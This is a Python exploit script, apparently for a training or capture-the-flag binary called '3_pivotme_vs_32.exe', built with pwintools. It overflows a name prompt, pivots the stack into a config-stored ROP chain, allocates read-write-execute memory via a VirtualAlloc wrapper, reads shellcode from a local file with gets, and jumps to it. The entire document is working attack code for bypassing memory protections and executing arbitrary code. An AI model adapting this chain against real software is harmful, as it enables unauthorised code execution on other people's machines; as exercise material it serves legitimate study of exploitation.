#

from pwintools import *

retAddrOffs = 36

PIVOT_ADDRESS = 0x46e2e0 # address of GlobalConfigs

# gadgets
STACK_PIVOT = 0x0042cd20 # xchg esp, eax; ret;

VIRTUAL_ALLOC_WRAPPER = 0x4088D2
GETS_ADDR = 0x42C1D9

SAVE_EAX = 0x0043ffbc # mov dword ptr [0x46ef6c], eax; ret;
RESTORE_EAX = 0x0042d1aa # mov eax, dword ptr [0x46ef6c]; ret;

MOV_ECX_ESP = 0x00407337 # mov ecx, esp; ret;
MOV_P_ECX_16_EAX = 0x0043e40e # mov dword ptr [ecx + 0x10], eax; ret;
NOP = 0x0040152e # ret;

# POP_ECX = 0x00407527
POP_EDX = 0x004520ae
ADD_EAX_EDX = 0x00414751
XCHG_P_EAX_EDX = 0x00436404 # xchg dword ptr [eax], edx; ret;
ADD_EAX_EDX = 0x00414751 # add eax, edx; ret;
# MOV_P_EAX_4_ECX = 0x00407d27 # mov dword ptr [eax + 4], ecx; ret;

POP_EAX = 0x00409f78
JMP_EAX = 0x00408145

ADD_ESP_4 = 0x0042ddea # add esp, 4; ret;


# main

#p.set_timeout(3600000) # to have time to interact with the debugger
# input('press enter after attaching the debugger...')

f = open('TMP', 'rb')
shellcode = f.read()
f.close()

# strategy: allocate rwx memory; call gets to write into it; jump there
ropchain = (
	p32(VIRTUAL_ALLOC_WRAPPER) +
	# p32(SAVE_EAX) + # stdcall + rop = gg ez: the next 4 dwords will be popped by ret
	p32(POP_EDX) +
	p32(0) + # where
	p32(10 * 4096) + # size
	p32(MEM_RESERVE | MEM_COMMIT) +
	p32(0 + PAGE_EXECUTE_READWRITE) +
	
	p32(9 * 4096) + # for pop edx
	p32(ADD_EAX_EDX) +

	# p32(0xdeadc0de) + # dummy value for pop ebp
	p32(MOV_ECX_ESP) +
	p32(MOV_P_ECX_16_EAX) +
	p32(SAVE_EAX) +

	p32(GETS_ADDR) +
	p32(ADD_ESP_4) + # cdecl needs skipping params
	p32(1337) + # here will go allocated mem

	# the pivoted stack is too small for WinExec after a certain Windows update:
	# so more space was allocated for the stack and the ropchain's end is written there
	p32(RESTORE_EAX) +
	p32(POP_EDX) +
	p32(0xfffffffc) +
	p32(ADD_EAX_EDX) +
	p32(POP_EDX) +
	p32(JMP_EAX) + # last ropchain item
	p32(XCHG_P_EAX_EDX) +
	p32(POP_EDX) +
	p32(0xfffffffc) +
	p32(ADD_EAX_EDX) +
	p32(POP_EDX) +
	p32(RESTORE_EAX) + # before-last ropchain item
	p32(XCHG_P_EAX_EDX) +
	p32(STACK_PIVOT)

	# p32(RESTORE_EAX) +
	# p32(JMP_EAX)
)
f = open('config.bin', 'wb')
f.write(ropchain)
f.close()

p = Process('3_pivotme_vs_32.exe')

p.recvuntil(b'name:\r\n')

pivot_ropchain = (
	p32(POP_EAX) +
	p32(PIVOT_ADDRESS) +
	p32(STACK_PIVOT)
)

p.sendline(b'a'*retAddrOffs + pivot_ropchain) # this will pivot to the longer ropchain

shellcode = asm('add esp, 4000', 32) + shellcode
p.sendline(shellcode) # this part will be read by the ropchain's gets

print(p.recvall())
